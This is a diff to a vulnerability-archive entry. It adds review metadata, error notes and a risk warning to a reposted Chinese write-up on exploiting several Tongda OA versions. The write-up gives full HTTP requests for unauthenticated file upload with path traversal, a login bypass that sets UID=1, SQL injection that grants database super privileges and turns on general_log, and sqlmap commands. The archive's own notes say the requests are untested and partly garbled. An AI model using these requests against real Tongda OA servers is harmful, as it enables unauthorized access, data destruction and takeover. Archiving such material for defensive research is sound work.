@@ -1,10 +1,51 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "通达OA 多版本认证绕过、删除、SQL 注入与上传集合"
+product: "通达OA"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "11.2/11.3/11.5/11.6/11.7分别"
+prerequisites: "未授权、后台、DB权限混合"
+side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/HK0jStWzqrQVXKmgzYYljg"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E6%96%87%E5%BA%93%20-%20%E9%80%9A%E8%BE%BE%20OA%20%E9%83%A8%E5%88%86%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E.md"
+category_recommendation: "OA / 通达"
+id: "vw-5d3e887ecb5f1865a0e9cbf6"
+entity_id: "ve-5d3e887ecb5f1865a0e9cbf6"
+schema_version: "1"
 ---
 
-# 文库 - 通达 OA 部分版本漏洞
+# 通达OA 多版本认证绕过、删除、SQL 注入与上传集合
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：通达OA；多版本认证绕过、删除、SQLi与上传集合
+- 版本、配置及部署条件：11.2/11.3/11.5/11.6/11.7分别
+- 认证与权限前提：未授权、后台、DB权限混合
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 11.7权限赋予段错放logincheck请求；日程SQLi错放upload请求
+- multipart缺name/filename，HTTP缺空行，SQL曲引号
+- 删除auth.inc.php破坏文件并解除鉴权；DB账号/超级权限/日志配置更改无恢复步骤
+- delete_cascade与扫码内容重复，来源归属不清
+
+## 操作风险
+
+请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HK0jStWzqrQVXKmgzYYljg)
 
 **高质量的安全文章，安全 offer 面试经验分享**
@@ -27,7 +68,7 @@ source: "MrWQ/vulnerability-paper"
 
   
 
-### 判断通达版本
+#### 判断通达版本
 
 inc/expired.php  
 
@@ -43,7 +84,7 @@ inc\reg_trial_submit.php
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HgOx4KOlCYTLUiaZ2YLkA05JnvacYlTSGG7sO5vftIxnic3rkFelDLBiaw/640?wx_fmt=png)
 
-### 用户名 / 邮箱收集
+#### 用户名 / 邮箱收集
 
 ispirit/retrieve_pwd.php?username=admin  
 
@@ -51,7 +92,7 @@ ispirit/retrieve_pwd.php?username=admin
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8H554KKCoWWAUHkbDfIRqk9bKDwHav4fcS6SAD0CbPTqMCXkp1JQjgQA/640?wx_fmt=png)
 
-### 计算机名
+#### 计算机名
 
 resque/worker.php
 
@@ -69,14 +110,13 @@ resque/worker.php
 
 2. 构造 post 数据包上传文件
 
-```
+```http
 POST /general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./ HTTP/1.1
 Host: 192.168.179.128:96
 User-Agent: python-requests/2.23.0
 Accept-Encoding: gzip, deflate
 Accept: */*
 Connection: keep-alive
-Content-Length: 855
 Content-Type: multipart/form-data; boundary=abc
 
 
@@ -89,6 +129,8 @@ Content-Disposition: form-data;
 
 --abc--
 ```
+
+> 请求长度说明：原资料 Content-Length 为 855；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HSPe4TuIOHnTpFa2n9x3rRKpWVQaCfv1vsu5TsVMQ7ItMmfQHpEHFvQ/640?wx_fmt=png)  
 
@@ -122,7 +164,7 @@ Content-Disposition: form-data;
 ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HLbTia6b5Kfb93pvufgVEZ3roR3jfImArOHcCez2x9rdATkwcpXwLCjA/640?wx_fmt=png)  
 在数据库里构造
 
-```
+```http
 POST /logincheck_code.php HTTP/1.1
 Host:192.168.179.128:96
 User-Agent:Mozilla/5.0(Windows NT 10.0;Win64; x64; rv:80.0)Gecko/20100101Firefox/80.0
@@ -132,11 +174,12 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 52
 
 
 CODEUID={BED9DDBF-B3A5-ADAA-F671-9E349EAC7B5D}&UID=1
 ```
+
+> 请求长度说明：原资料 Content-Length 为 52；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 给用户赋予超级权限，  
 在注入点构造`general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges`刷新权限后重新登录，输入`set global general_log = on;`
@@ -278,14 +321,13 @@ sqlmap:`python3 sqlmap.py -u "xxxx.com/general/appbuilder/web/report/repdetail/e
 条件：需要账号  
 POST 包：
 
-```
+```http
 POST /general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./ HTTP/1.1
 Host:192.168.179.128:96
 User-Agent: python-requests/2.23.0
 Accept-Encoding: gzip, deflate
 Accept:*/*
 Connection: keep-alive
-Content-Length: 855
 Content-Type: multipart/form-data; boundary=abc
 
 
@@ -298,6 +340,8 @@ Content-Disposition: form-data;
 
 --abc--
 ```
+
+> 请求长度说明：原资料 Content-Length 为 855；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 SQLMAP:`python3 sqlmap.py -r “1.txt”  
 
@@ -318,7 +362,7 @@ version < 11.5 未授权访问 & 文件上传
 
 构造如下 post 包
 
-```
+```http
 POST /logincheck_code.php HTTP/1.1
 Host:192.168.179.128:96
 User-Agent:Mozilla/5.0(Windows NT 10.0;Win64; x64; rv:80.0)Gecko/20100101Firefox/80.0
@@ -340,7 +384,7 @@ CODEUID={BED9DDBF-B3A5-ADAA-F671-9E349EAC7B5D}&UID=1
 
 构造如下数据包
 
-```
+```http
 POST /general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./ HTTP/1.1
 Host:192.168.179.128:96
 User-Agent: python-requests/2.23.0
